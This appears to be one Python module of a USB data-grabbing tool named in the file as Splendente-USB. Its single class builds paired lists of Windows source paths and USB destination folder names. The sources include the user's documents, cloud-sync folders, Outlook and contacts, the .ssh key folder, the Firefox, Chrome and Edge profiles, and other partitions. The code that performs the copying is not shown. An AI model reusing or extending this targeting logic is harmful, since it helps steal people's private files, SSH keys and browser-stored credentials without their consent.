# -*- coding: utf-8 -*-

# https://github.com/Hnfull/Splendente-USB

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import os
import glob
import re

#--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#

class Directories:

    def __init__(self):
        self.windowsHome    = "WindowsHome"
        self.documents      = "Documents"
        self.downloads      = "Downloads"
        self.pictures       = "Pictures"
        self.desktop        = "Desktop"
        self.dropbox        = "Dropbox"
        self.oneDrive       = "OneDrive"
        self.contacts       = "Contacts"
        self.outlook        = "Outlook"
        self.ssh            = "SSH"
        self.firefox        = "Firefox"
        self.chrome         = "Chrome"
        self.microsoftEdge  = "MicrosoftEdge"
        self.usb            = "USB"
        self.target         = "Target"
        self.otherPartitions = "OtherPartitions"


    def Search(self, dirConf, typeOflist, targetMount, usbMount):
        targetDirectoriesList   = []
        usbDirectoriesList      = []

        for directory in dirConf:
            if directory == self.windowsHome:
                if os.path.exists(os.environ["USERPROFILE"]) == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"])
                    usbDirectoriesList.append("WindowsHome")

            elif directory == self.documents:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Documents") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Documents")
                    usbDirectoriesList.append("Documents")

            elif directory == self.downloads:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Downloads") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Downloads")
                    usbDirectoriesList.append("Downloads")

            elif directory == self.pictures:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Pictures") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Pictures")
                    usbDirectoriesList.append("Pictures")

            elif directory == self.desktop:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Desktop") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Desktop")
                    usbDirectoriesList.append("Desktop")

            elif directory == self.dropbox:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Dropbox") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Dropbox")
                    usbDirectoriesList.append("Dropbox")

            elif directory == self.oneDrive:
                if os.path.exists(os.environ["USERPROFILE"] + "\\OneDrive") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\OneDrive")
                    usbDirectoriesList.append("OneDrive")

            elif directory == self.contacts:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Contacts") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Contacts")
                    usbDirectoriesList.append("Contacts")

            elif directory == self.outlook:
                if os.path.exists(os.environ["USERPROFILE"] + "\\Outlook") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Outlook")
                    usbDirectoriesList.append("Outlook")

            elif directory == self.ssh:
                if os.path.exists(os.environ["USERPROFILE"] + "\\.ssh") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\.ssh")
                    usbDirectoriesList.append("SSH")

            elif directory == self.firefox:
                if os.path.exists(os.environ["APPDATA"] + "\\Mozilla\\Firefox\\Profiles") == True:
                    targetDirectoriesList.append(os.environ["APPDATA"] + "\\Mozilla\\Firefox\\Profiles")
                    usbDirectoriesList.append("Firefox")

            elif directory == self.chrome:
                if os.path.exists(os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default") == True:
                    targetDirectoriesList.append(os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default")
                    usbDirectoriesList.append("Chrome")
            
            elif directory == self.microsoftEdge:
                if os.path.exists(os.environ["LOCALAPPDATA"] + "\\MicrosoftEdge\\User\\Default") == True:
                    targetDirectoriesList.append(os.environ["LOCALAPPDATA"] + "\\MicrosoftEdge\\User\\Default")
                    usbDirectoriesList.append("MicrosoftEdge")

            elif directory == self.otherPartitions:
                for mount in targetMount:
                    for usbMountDir in usbMount:
                        usbMountDir = usbMountDir[0]
                        if re.match(r"\w", usbMountDir) and usbMountDir != "G":
                            targetDirectoriesList.append(mount)
                            usbDirectoriesList.append(usbMountDir)
            else:
                continue

        if typeOflist == self.usb:
            return usbDirectoriesList[:]
        elif typeOflist == self.target:
            return targetDirectoriesList[:]
        else:
            return 1


            

        